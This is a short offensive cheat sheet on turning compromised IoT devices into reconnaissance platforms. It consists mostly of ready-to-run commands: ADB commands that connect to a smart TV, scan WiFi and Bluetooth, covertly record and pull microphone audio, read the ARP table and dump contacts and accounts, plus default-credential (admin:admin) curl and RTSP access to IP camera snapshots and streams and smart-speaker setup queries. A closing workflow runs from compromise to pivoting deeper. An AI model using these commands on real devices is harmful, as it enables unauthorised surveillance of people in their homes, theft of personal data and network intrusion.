# IoT Pivot Reconnaissance

## Overview
Use compromised IoT devices (smart TVs, cameras, speakers, routers) as sensor platforms to discover the physical and digital environment. WiFi, Bluetooth, microphone, camera, network - every IoT device is a recon tool.

## Smart TV via ADB (Most Common)
```bash
adb connect TARGET:5555

# WiFi networks nearby
adb shell 'dumpsys wifi' | grep -E "SSID|BSSID|level"

# Bluetooth devices
adb shell 'dumpsys bluetooth_manager' | grep -E "name=|address="

# Microphone recording
adb shell 'tinycap /sdcard/rec.wav -D 0 -d 0 -c 1 -r 16000 -b 16 -T 30'
adb pull /sdcard/rec.wav

# Network discovery from TV position
adb shell 'cat /proc/net/arp'

# User data
adb shell 'content query --uri content://com.android.contacts/contacts'
adb shell 'dumpsys account' | grep "Account {"
```

## IP Camera
```bash
curl http://IP/cgi-bin/snapshot.cgi -u admin:admin
ffplay rtsp://admin:admin@IP:554/stream1
```

## Smart Speaker
```bash
curl http://IP:8008/setup/eureka_info
curl http://IP:8008/setup/scan_wifi
```

## Workflow
1. Compromise IoT → 2. WiFi scan → 3. BT scan → 4. ARP/UPnP → 5. Mic/Camera → 6. Saved creds → 7. Pivot deeper
